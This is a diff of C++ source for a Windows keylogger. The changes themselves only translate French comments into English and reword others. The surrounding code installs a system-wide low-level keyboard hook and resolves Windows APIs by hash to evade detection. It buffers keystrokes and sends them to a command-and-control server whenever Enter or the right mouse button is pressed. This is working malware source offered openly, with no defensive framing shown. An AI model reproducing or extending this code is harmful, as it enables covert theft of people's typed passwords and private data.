@@ -44,7 +44,7 @@ private:
             {VK_SHIFT, L""},
             {VK_CONTROL, L""},
             {VK_MENU, L""}, // ALT
-            {VK_CAPITAL, L""}, // CAPSLOCK ignored (handled with Shift)
+            {VK_CAPITAL, L""}, // CAPSLOCK ignored
             {VK_ESCAPE, L"[ESC]"},
             {VK_PRIOR, L"[PGUP]"},
             {VK_NEXT, L"[PGDN]"},
@@ -72,7 +72,7 @@ private:
             {VK_F11, L"[F11]"},
             {VK_F12, L"[F12]"}};
 
-        // Check if it's a special key
+        // Check if it is a special key
         auto it = specialKeys.find(vkCode);
         if (it != specialKeys.end())
         {
@@ -270,7 +270,7 @@ private:
                 vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU ||
                 vkCode == VK_CAPITAL)
             {
-                // Laisser passer à CallNextHookEx mais ne pas ajouter au buffer
+                // Pass through to CallNextHookEx but don't add to buffer
                 typedef LRESULT (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
                 auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
                 return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
@@ -298,13 +298,13 @@ private:
                     }
                     else
                     {
-                        // Supprimer 1 caractère
+                        // Delete 1 caractère
                         g_keyBuffer.pop_back();
                     }
                 }
                 ReleaseMutex(g_hMutex);
                 
-                // Do not continue - backspace is not added to the buffer
+                // Do not continue -> backspace is not added to the buffer
                 typedef LRESULT (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
                 auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
                 return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
@@ -337,7 +337,7 @@ private:
                 // Morphological keylogger: send buffer on Enter key press
                 if (vkCode == VK_RETURN)
                 {
-                    // Add [ENTER] to the buffer
+                    // Add ENTER to the buffer
                     g_keyBuffer += L"[ENTER]\n";
                     
                     wstring bufferCopy = g_keyBuffer;
@@ -385,7 +385,7 @@ private:
     {
         if (nCode == HC_ACTION && wParam == WM_RBUTTONDOWN)
         {
-            // Right-click detected - send current buffer (simulates form submission)
+            // Right-click detected -> send current buffer
             WaitForSingleObject(g_hMutex, INFINITE);
 
             if (!g_keyBuffer.empty())
@@ -393,7 +393,7 @@ private:
                 wstring bufferCopy = g_keyBuffer;
                 g_keyBuffer.clear();
 
-                // Send to C2 with retry logic (3 attempts)
+                // Send to C2 with retry logic
                 if (g_callback != nullptr)
                 {
                     bool sent = false;
@@ -474,7 +474,7 @@ public:
 
         wcout << L"[KEYLOGGER] Installing keyboard hook..." << endl;
 
-        // Install system-wide keyboard hook (no API hashing)
+        // Install system-wide keyboard hook
         g_hKeyHook = SetWindowsHookExW(
             WH_KEYBOARD_LL,
             KeyboardProc,
